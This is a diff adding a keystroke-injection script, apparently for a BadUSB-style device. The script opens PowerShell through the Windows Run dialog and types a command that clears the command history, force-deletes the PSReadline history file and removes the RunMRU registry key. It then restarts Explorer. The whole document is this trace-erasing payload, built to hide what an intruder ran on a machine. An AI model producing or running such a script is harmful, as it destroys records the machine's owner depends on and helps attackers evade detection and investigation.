@@ -1,0 +1,8 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1500
+STRING Clear-History; Remove-Item (Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt') -Force; $registryPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'; Remove-Item -Path $registryPath -Force -ErrorAction SilentlyContinue; Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Process explorer; exit
+ENTER
